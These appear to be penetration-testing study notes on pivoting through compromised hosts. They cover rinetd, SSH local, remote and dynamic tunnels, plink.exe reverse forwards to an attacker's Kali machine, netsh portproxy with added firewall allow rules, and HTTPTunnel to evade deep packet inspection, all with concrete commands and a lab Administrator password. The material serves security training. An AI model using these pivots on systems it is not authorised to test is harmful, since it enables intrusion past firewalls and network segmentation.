# Port Redirection and Tunneling

<br>

## Port Forwarding
> Port forwarding is where you redirect traffic destined for one IP address and port to another IP address and port.


#### RINETD
> RINETD is a daemon tool that lets you redirect traffic coming from a target machine to another machine, using the tool that machine is installed on as a pivot point.
- installion: `sudo apt update && sudo apt install rinetd`
- configuration: edit the `/etc/rinetd.conf` file that contains rules for port forwarding which require four parameters;  *bindaddress* and *bindport*, which define the bound (“listening”) IP address and port, and *connectaddress* and *connectport*, which define the traffic’s destination address and port:
	- i.e. the rule `0.0.0.0 80 216.58.207.142 80` states that all traffic received on port 80 of our server, listening on all interfaces (0.0.0.0), regardless of destination address, will be redirected to 216.58.207.142:80.
- once a rule has been wrote you need to restart the `rinetd` service 
	- i.e. `sudo service rinetd restart` and `ss -antp | grep "80"` to confirm that the service is listening on TCP port 80
- then you can connect from the target machine, through the listening server, and to the IP address 216.58.207.142 on port 80 
	- i.e. `nc -nvv <listening_machine_ip> 80`
- this technique can be used to connect a Internet-disconnected client to an Interent server, through previously exploited pivot point which is Internet-connected

<br>

--- 

## Tunneling
> Tunneling a protocol involves encapsulating it within a different protocol. By using various tunneling techniques, we can carry a given protocol over an incompatible delivery network, or provide a secure path through an untrusted network.

#### SSH Tunneling
> The SSH protocol is one of the most popular protocols for tunneling and port forwardingas it can create encrypted tunnels which support bi-directrional communication channels. 

**SSH Local Port Forwarding**:
- SSH *local port forwarding* allows you to tunnel a local port to a remote server using SSH as the transport protocol
- scenario: you compromise a Linux-based machine which has SSH port open on Firewall and a connection to an internal machine
- usage: `ssh -N -L [bind_address:]port:host:hostport [username@address]`
	- i.e. on Kali machine: `sudo ssh -N -L <local_ip>:<local_port>:<target_ip>:<target_port> <compromised_user>@<compromised_host>`
- to forward traffic directed at local machine's port 445, through compromised target (10.11.1.4), to internal target  (192.168.1.24) port 445: `sudo ssh -N -L 0.0.0.0:445:192.168.1.24:445 john@10.11.1.4`
	- i.e. then you can run `smbclient -L 127.0.0.1 -U Administrator`
- if targetting a Windows 2016 server you need to add "min protocol = SMB2" to the end of your Samba configuration file (`/etc/samba/smb.conf`), as it no longer supports SMBv1 by default
- once setup, this traffic will be tunneled through SSH so the it will be encrypted 
- additional ports can be added to conduct additional reconaissance

**SSH Remote Port Forwarding**:
- SSH *remote port forwarding* lets you open a port on the remote side of the connection and traffic is sent to that port is forwarded to a port on the local machine (the machine initiating the SSH client)
- connections to the specified TCP port on the remote host will be forwarded to the specified port on the local machine
- scenario: you have a non-root shell on a Linux client on the internal network and inbound SSH is blocked, but outbound TCP port 22 is allowed through the firewall
- you can use SSH remote port forwarding to open a port on Kali machine that forwards traffic to a local service (i.e. MySQL port 3306) on the internal target -- all forwarded traffic will traverse the SSH tunnel and through the firewall
- SSH port forwards can be run as non-root users as long as we only bind unused non-privileged local ports (above 1024)
- usage: `ssh -N -R [bind_address:]port:host:hostport [username@address]`
	- i.e. on compromised host: `ssh -N -R <kali_ip>:<kali_port>:<local_ip>:<local_port> kali@<kali_ip>`
- to forward all incoming traffic on Kali system's local port 2221 to port 3306 on the compromised host through an SSH tunnel (TCP 22), on compromised host: `ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4`
	- this lets you reach the MySQL port even if its filtered at the firewall
	- to validate TCP port 2221 is listening on Kali machine: `ss -antp | grep "2221"`
	- to scan the localhost on that port with Nmap and fingerprint the target's MySQL service: `sudo nmap -sS -sV 127.0.0.01 -p 2221`

**SSH Dynamic Port Forwarding**
- SSH *dynamic port forwarding* lets you set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy
- scenario: you have compromised a Linux-based target and have elevated privileges, there are no inbound/outbound firewall rules, and the target is connected to an additional internal network with other targets on it
- SSH local port forwarding limits enumeration to a particular IP address and port, whereas dynamic port forwading lets you target additional ports on a target and other hosts on the internal network through a SOCKS4 application proxy
- usage: `ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>`
	- i.e. on Kali machine: `sudo ssh -N -D <kali_ip>:<kali_port> <compromised_user>@<compromised_host>
- to create a local SOCKS4 application proxy on Kali machine on TCP port 8080 that will tunnel all incoming traffic to any host in the target network, through the compromised Linux machine (10.11.0.128) using "student" SSH account: `sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128`
- next, to direct recon/attack tools to this proxy you can use the `proxychains` tool that can use HTTP, SOCKS4, and SOCKS5 proxies
- to configure ProxyChains, edit the main configuration file `/etc/proxychains.con` and add the SOCKS4 proxy to it (i.e. `socks4 127.0.0.1 8080`)
- then to run a tool through ProxyChains just prepend each command with `proxychains` (i.e. `sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.120`)
- by default, ProxyChains will attempt to read its configuration file first from the current directory, then from the user’s `$(HOME)/.proxychains` directory, and finally from `/etc/proxychains.conf`. This allows us to run tools through multiple dynamic tunnels, depending on our needs.

<br>

#### PLINK.exe
> PLINK.exe is a Windows-based command line SSH client (part of the PuTTY project) that allows you to perform SSH port forwarding on a compromised Windows machine.

- scenario: you have compromised a Windows-based host and discovered a local service running which you cannot interact with directrly ecause of a firewall
- first, transfer `plink.exe` onto the target system 
- remote port forward usage: `plink.exe -ssh -l kali -pw <password> -R <kali_ip>:<kali_port>:127.0.0.1:<local_port>`
- to setup a SSH remote port forward to the MySQL port on the Windows target, on Windows host run: `plink.exe -ssh -l kali -pw kali -R 10.11.0.4:1234:127.0.0.1:3306`
- the first time plink connects to a host, it will attempt to cache the host key in the registry. However, since this will most likely not work with the interactivity level of a typical reverse shell, you should pipe the answer to the prompt with the `cmd.exe /c echo y` command to successfully establish the remote port forward without any interaction
	- i.e. on Windows host: `cmd.exe /c echo y | plink.exe -ssh -l kali -pw kali -R 10.11.0.4:1234:127.0.0.1:3306`
- once the tunnel is establised you can run tools directed at the local kali host
	- i.e. to scan local Windows port 3306 from Kali host run: `sudo nmap -sS -sV 127.0.0.1 -p 1234` 
	
<br>

#### NETSH
> NETSH is a utility installed by default on every modern version of Windows that can be used for port forwarding and pivoting. However, there are some requirements to using it that must be fulfilled on the compromised host.

- scenario: you have a SYSTEM shell on a modern Windows target and you discover and the machine is attached to an internal network
- a SYSTEM-level shell means you do not have to deal with User Access Control (UAC) and you can use the `netsh` utility so long as the "IP Helper" service is running and "IPv6" support is enabled (both of these are enabled by default on Windows)
	- you can check the *IP Helper* service is running via the Windows *Services* program, and you confirm *IPv6* support in the network interface's settings
- to redirect traffic destined for a compromised Windows 10 machine (10.11.0.22) on TCP port 4455 to an internal Windows Server 2016 machine (192.168.1.110) on port 445: `netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110`
	- to confirm port 4455 is listening on the compromised Windows host: `netstat -anp TCP | find "4455"`
- by default, the Windows Firewall will disallow inbound connections on TCP port 4455, which will prevent you from interacting with the tunnel
- since you have a SYSTEM shell you can remedy this by adding a firewall rule to allow inbound connection on that port with `netsh`
	- i.e. `netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow`
- if targetting a Windows 2016 server you need to add "min protocol = SMB2" to the end of your Samba configuration file (`/etc/samba/smb.conf`), as it no longer supports SMBv1 by default
- once setup you can run SMB tools at compromised Windows 10 host (10.11.0.22) targetting port 4455 and they will be forwarded onto the Windows 2016 server (192.168.1.110) port 445 from Kali machine
	- i.e. on Kali machine: `smbclient -L 10.11.0.22 --port=4455 --user=Administrator`
- `smbclient` may generate a timeout error caused by a port forwarding error, but you sill should be able to interact with the shares -- the error only prohibits you listing workgroups and does not impact your ability to mount the share
	- i.e. to mount the share on Kali machine: `sudo mkdir /mnt/win10_share/` -> `sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share` -> `ls -l /mnt/win10_share`

<br>

#### HTTPTunnel-ing Through Deep Packet Inspection
> Certain deep packet content inspection devices may only allow specific protocols and, as such, if the SSH protocol is not allowed then the tunnels that rely on this protocol would fail. HTTPTunnel is a tool that encapsulated your traffic in HTTP requests to create a "HTTP tunnel". It uses a client/server model so you need to first install the tool and then run both a client and a server.

- installation: `sudo apt update && sudo apt install httptunnel`
- scenario: you have a root shell on a compromised Linux server, the firewall only allows ports 80, 443, and 1234 inbound/outbound, and you want to connect to RDP on an internal Windows 2016 Server (this can be done over SSH due to different interace)
- a) setup a local SSH-based port forward between compromised Linux machine and the Windows remote desktop target (192.168.1.110) -- the protocol does not matter here as traffic is unaffected by deep packet inspection on the internal network
	- i.e. on compromised Linux host: `ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1`
	- creates a local port forward (port 8888) to port 3389 on Windows Server, using "student" SSH account
	- confirm compromised Linux host is listening with: `ss -atnp | grep "8888"`
- b) create an HTTPTunnel out to the Kali machine to slip traffic past the HTTP-only protocol restriction
	- i.e. on compromised Linux host setup the server: `hts --forward-port localhost:8888 1234` -- listens on port 1234, decapsulates the traffic from the incoming HTTP stream, and redirets it to localhost port 8888
		- can confirm this with: `ps aux | grep hts` and `ss -atnp | grep "1234"`
	- i.e. on Kali machine setup the client: `htc --forward-port 8080 10.11.0.128:1234` -- listens on port 8080, HTTP-encapsulates the traffic, and forwards it across the firewall to the listening HTTPTunnel server on port 1234
		- can confirm this with: `ps aux | grep htc` and `ss -atnp | grep "8080"`
- now, all traffic sent to TCP port 8080 on our Kali Linux machine will be redirected into the HTTPTunnel (where it is HTTP-encapsulated, sent across the firewall to the compromised Linux server and decapsulated) and redirected again to the Windows Server’s remote desktop service
- to initate the RDP connection to the internal Windows Server: `rdesktop 127.0.0.1:8080`